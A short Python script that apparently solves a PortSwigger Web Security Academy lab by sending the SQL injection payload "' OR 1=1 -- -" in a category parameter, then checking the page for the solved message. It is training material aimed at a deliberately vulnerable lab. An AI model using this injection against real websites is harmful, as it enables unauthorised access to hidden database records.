import requests
from urllib3.exceptions import InsecureRequestWarning
import time

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
# db: MySQL
# author: 0xyf


class SQLi1:
    def __init__(self):
        lab_id = "0aee00e8041db60580787650000b00c8"
        path = "filter"
        self.URL = f"https://{lab_id}.web-security-academy.net/{path}"
        self.proxies = {"https": "http://127.0.0.1:8080"}

    def execute_request(self, payload):
        params = {"category": payload}
        requests.get(f"{self.URL}", params=params, proxies=self.proxies, verify=False)

    def check_solved(self):
        time.sleep(2)
        r = requests.get(self.URL)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def get_hidden_data(self):
        payload = "' OR 1=1 -- -"
        r = self.execute_request(payload)
        self.check_solved()


def main():
    SQLi1().get_hidden_data()


if __name__ == "__main__":
    main()
